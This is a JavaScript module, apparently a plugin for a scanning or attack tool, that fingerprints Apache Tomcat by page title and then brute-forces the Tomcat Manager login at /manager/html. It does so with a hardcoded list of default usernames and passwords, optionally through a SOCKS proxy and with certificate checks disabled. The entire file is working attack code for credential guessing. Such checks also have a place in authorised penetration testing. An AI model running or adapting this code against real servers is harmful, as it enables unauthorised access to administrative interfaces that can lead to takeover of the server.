import got from 'got'
import SocksProxyAgent from 'socks-proxy-agent'

const credentials = {
  "tomcat": ["s3cret", "tomcat", "", "admanager", "admin", "adrole1", "adroot", "ads3cret", "adtomcat", "advagrant", "changethis", "password", "password1"],
  "ADMIN": ["ADMIN"],
  "QCC": ["QLogic66"],
  "admin": ["", "Password1", "admanager", "admin", "adrole1", "adroot", "ads3cret", "adtomcat", "advagrant", "owaspbwa", "password", "password1", "tomcat", "vagrant"],
  "both": ["admanager", "admin", "adrole1", "adroot", "ads3cret", "adtomcat", "advagrant", "tomcat"],
  "cxsdk": ["kdsxc"],
  "demo": ["demo"],
  "j2deployer": ["j2deployer"],
  "manager": ["admanager", "admin", "adrole1", "adroot", "ads3cret", "adtomcat", "advagrant", "manager"],
  "ovwebusr": ["OvW*busr1"],
  "role": ["changethis"],
  "role1": ["admanager", "admin", "adrole1", "adroot", "ads3cret", "adtomcat", "advagrant", "role1", "tomcat"],
  "root": ["Password1", "admanager", "admin", "adrole1", "adroot", "ads3cret", "adtomcat", "advagrant", "changethis", "owaspbwa", "password", "password1", "r00t", "root", "toor"],
  "server_admin": ["owaspbwa"],
  "xampp": ["xampp"]
}

async function match_fingerprint(service, proxy){
  if(service.title.includes('Tomcat')){
    return service.title
  }else{
    return false
  }
}

async function bruteforce(service, proxy){
  for(var user in credentials) {
    for(var pwd of credentials[user]){
      let options = {
        "throwHttpErrors": false,
        "https": {rejectUnauthorized: false},
        "username": user,
        "password": pwd
      }
      if(proxy != ''){
        var proxy_agent = new SocksProxyAgent(proxy) 
        options.agent = {
          http: proxy_agent,
          https: proxy_agent
        }
      }
      let response = await got(`${service.url}/manager/html`, options).catch(function(err){
        console.log(`Failed Attempt: ${user}:${pwd}`); console.log(err)
      })
      if(response && response.statusCode == 200){
        return `${user}:${pwd}`
      }
    }
  }
  return false
}

export {match_fingerprint, bruteforce}
